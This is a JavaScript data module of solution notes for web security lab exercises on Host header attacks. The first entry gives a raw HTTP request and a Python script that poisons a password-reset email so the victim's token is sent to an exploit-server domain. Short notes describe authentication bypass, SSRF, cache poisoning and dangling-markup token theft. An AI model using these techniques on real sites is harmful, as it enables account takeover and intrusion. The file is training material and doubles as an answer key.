export default {
  'host-header-lab-host-header-basic-password-reset-poisoning': {
    note: 'The reset email builds its link from `Host`; set it to your exploit server and capture the victim\'s token.',
    work: {
      hints: [
        'Request a password reset for your own account and inspect the email. The link\'s host comes from the request.',
        'Change the `Host` header to your exploit server domain and request a reset for `carlos`.',
        'Read the token from the exploit server access log, then use the legitimate reset link with that token to set Carlos\'s password.'
      ],
      approach:
        'The application uses a client-controlled header to generate an absolute URL in a security-sensitive email. The token is valid; it is delivered to the attacker\'s domain instead of the victim\'s. This is a Host header injection with a direct account-takeover consequence.',
      request: `POST /forgot-password HTTP/1.1
Host: exploit-EXPLOIT-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos`,
      tokens: [
        ['POST /forgot-password', 'The reset initiation endpoint. It accepts a username and sends an email.'],
        ['Host:', 'Used by the framework to build the absolute reset URL. It is attacker-controlled.'],
        ['exploit-...', 'The attacker domain that receives the victim\'s click and the token in the path/query.'],
        ['username=carlos', 'Targets the victim. The response is generic, but the email is sent.'],
        ['(access log)', 'The exploit server records the request containing the reset token.']
      ],
      script: `import sys, requests

host, exploit = sys.argv[1], sys.argv[2]
r = requests.post(
    f"https://{host}/forgot-password",
    data={"username": "carlos"},
    headers={"Host": exploit},
    timeout=20,
)
print(r.status_code)
print("check the exploit server access log for /forgot-password?temp-forgot-password-token=...")`
    }
  },
  'host-header-lab-host-header-authentication-bypass': {
    note: 'The admin panel is bound to an internal hostname; send `Host: localhost` to reach it without credentials.'
  },
  'host-header-lab-host-header-web-cache-poisoning-via-ambiguous-requests': {
    note: 'The cache and origin disagree about which Host representation is authoritative; poison the shared entry.'
  },
  'host-header-lab-host-header-routing-based-ssrf': {
    note: 'The proxy routes by `Host`; point it at an internal host and reach the admin interface.'
  },
  'host-header-lab-host-header-ssrf-via-flawed-request-parsing': {
    note: 'An absolute-form request line and a mismatched `Host` make the proxy and backend route to different destinations.'
  },
  'host-header-lab-host-header-host-validation-bypass-via-connection-state-attack': {
    note: 'Host validation happens on the first request of a connection; send a valid request, then an invalid Host on the same connection.'
  },
  'host-header-lab-host-header-password-reset-poisoning-via-dangling-markup': {
    note: 'The reset link is not fully controllable; inject an unterminated attribute so the email body\'s token is sent to your server.'
  }
}
